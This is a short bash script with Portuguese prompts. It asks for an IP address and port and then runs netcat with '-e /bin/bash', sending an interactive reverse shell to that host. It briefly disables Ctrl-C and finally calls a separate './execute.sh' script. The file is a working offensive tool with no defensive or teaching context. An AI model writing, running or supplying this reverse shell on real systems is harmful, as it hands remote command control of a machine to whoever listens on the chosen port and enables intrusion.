#!/bin/bash
trap '' 2
echo
read -p "Informe o IP no qual deseja enviar a Shell: " IPlistening
read -p "Informe a porta que está escutando: " PORTA
echo
echo -e "Enviando a Shell para a porta \033[01;31m$PORTA\033[01;00m do \033[01;31m$IPlistening\033[01;00m"
echo
trap 2
nc $IPlistening $PORTA -e /bin/bash
./execute.sh
exit
